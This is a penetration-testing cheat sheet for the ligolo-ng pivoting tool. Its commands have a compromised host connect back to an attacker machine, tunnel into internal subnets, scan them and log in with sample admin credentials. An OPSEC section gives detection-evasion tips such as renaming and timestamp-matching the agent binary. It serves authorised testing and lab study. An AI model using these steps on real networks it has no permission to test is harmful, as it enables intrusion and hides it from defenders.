# ligolo-ng

**Tags:** `#ligolo-ng` `#tunnel` `#pivoting` `#proxy` `#tun`

Advanced tunneling/pivoting tool that creates a TUN interface on the attacker machine — acts like a VPN into the internal network. Traffic is routed natively through the OS without proxychains. Significantly more performant than SOCKS-based tools for multi-service pivoting.

**Source:** https://github.com/nicocha30/ligolo-ng
**Install:** Pre-installed on Kali. Download agent binary for target from releases.

```bash
# Kali — start proxy
sudo ligolo-proxy -selfcert

# Target — connect agent
./ligolo-agent -connect 10.10.14.5:11601 -ignore-cert
```

> [!note]
> The proxy runs on Kali and manages the TUN interface. The agent runs on the compromised host and connects back. Once a session is established and a tunnel started, traffic to the internal subnet routes automatically — no proxychains needed.

---

## Setup

```bash
# Create TUN interface (one-time setup per session)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start proxy server
sudo ligolo-proxy -selfcert          # self-signed cert
sudo ligolo-proxy -autocert          # LetsEncrypt (needs public domain)
```

Download agent binary for target architecture from:
https://github.com/nicocha30/ligolo-ng/releases

---

## Agent Connection

```bash
# Linux target
./ligolo-agent -connect 10.10.14.5:11601 -ignore-cert

# Windows target
.\ligolo-agent.exe -connect 10.10.14.5:11601 -ignore-cert

# With cert fingerprint (more secure than -ignore-cert)
# Get fingerprint from proxy startup output
./ligolo-agent -connect 10.10.14.5:11601 -accept-fingerprint <fingerprint>
```

---

## Proxy Console Commands

```bash
# Inside ligolo-proxy console after agent connects:
session                                         # list sessions, select one
ifconfig                                        # show target's network interfaces

# Start tunnel (routes traffic through agent)
tunnel_start --tun ligolo

# Add route to internal subnet on Kali
# Run on Kali (separate terminal):
sudo ip route add 172.16.5.0/24 dev ligolo
```

---

## Full Workflow

```bash
# 1. Kali — create TUN interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# 2. Kali — start proxy
sudo ligolo-proxy -selfcert

# 3. Target — run agent
./ligolo-agent -connect 10.10.14.5:11601 -ignore-cert

# 4. Proxy console — select session and start tunnel
session          # select the connected agent
tunnel_start --tun ligolo

# 5. Kali — add route to internal network
sudo ip route add 172.16.5.0/24 dev ligolo

# 6. Now access internal hosts directly from Kali
nmap -sT -Pn 172.16.5.10
evil-winrm -i 172.16.5.10 -u administrator -p Password123
```

---

## Multiple Interfaces / Double Pivot

```bash
# Create second TUN for second pivot
sudo ip tuntap add user $USER mode tun ligolo2
sudo ip link set ligolo2 up

# On second compromised host, run agent pointing to first pivot's agent
# (agent can relay — or run second proxy on a different port)

# Add route for second internal subnet
sudo ip route add 192.168.100.0/24 dev ligolo2
```

---

## Custom TUN Interface Name

```bash
# In proxy console
interface_create --name "pivot1"

# Then start tunnel on named interface
tunnel_start --tun pivot1

# Add route using named interface
sudo ip route add 172.16.5.0/24 dev pivot1
```

---

## Listener (Bind Shell / Redirect)

```bash
# In proxy console — add listener on agent side
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp
# Binds port 1234 on target, forwards to Kali:4444
# Useful for getting callbacks from deeper network hosts
```

---

## OPSEC

- Agent connects outbound over TLS on port 11601 — change with `--lport`
- Use `-autocert` with a real domain for legitimate-looking TLS
- Agent binary should be renamed and timestamp-matched
- Clean up: kill agent, remove binary, remove route (`sudo ip route del ...`), remove TUN interface

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
